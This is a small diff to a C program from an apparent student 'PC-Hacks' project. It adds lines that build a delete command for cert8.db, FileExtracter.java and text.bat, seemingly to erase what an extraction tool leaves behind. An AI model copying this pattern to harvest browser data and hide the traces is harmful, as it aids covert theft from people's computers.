@@ -3,7 +3,6 @@
 
 int main()
 {
-//Kevin Chang
    FILE *fp;
     char str[500];
   //  char address[] = " \"C:\\Users\\USER\\Documents\\GitHub\\CS-196-PC-Hacks\\FireExtinguisher\\"; //change this to the customizable address
@@ -18,6 +17,9 @@ int main()
     strcat(str, del);
     strcat(str, address);
     strcat(str, "\\cert8.db");
+    strcat(str, del);
+    strcat(str, address);
+    strcat(str, "\\FileExtracter.java");
     strcat(str, del);
     strcat(str, address);
     strcat(str,"text.bat\"");
